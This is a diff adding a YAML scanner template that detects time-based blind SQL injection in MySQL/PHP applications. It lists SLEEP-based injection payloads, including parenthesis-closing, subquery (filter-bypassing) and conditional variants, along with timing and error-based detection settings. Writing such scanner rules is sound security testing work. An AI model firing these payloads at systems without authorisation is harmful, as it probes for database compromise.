@@ -1,0 +1,43 @@
+id: sqli-time-mysql
+issue_code: sql_injection
+detection_condition: or
+detection_methods:
+  - time_based:
+      sleep: "{{.sleep_time}}"
+      confidence: 85
+  - response_check:
+      check: database_error
+      confidence: 80
+vars:
+  - name: sleep_time
+    value: "{{randomInt 5 8}}"
+launch:
+  operator: or
+  conditions:
+    - type: platform
+      value: mysql
+    - type: platform
+      value: php
+    - type: scan_mode
+      value: fuzz
+templates:
+  # Basic SLEEP injection
+  - "' AND SLEEP({{.sleep_time}})--"
+  - "' AND SLEEP({{.sleep_time}})#"
+  - "1' AND SLEEP({{.sleep_time}})--"
+  
+  # Closing parentheses variations
+  - "') AND SLEEP({{.sleep_time}})--"
+  - "')) AND SLEEP({{.sleep_time}})--"
+  
+  # Subquery SLEEP (bypasses some filters)
+  - "' AND (SELECT SLEEP({{.sleep_time}}))--"
+  
+  # Conditional SLEEP
+  - "' AND IF(1=1,SLEEP({{.sleep_time}}),0)--"
+categories:
+  - sql_injection
+  - time_based
+  - mysql
+platforms:
+  - mysql
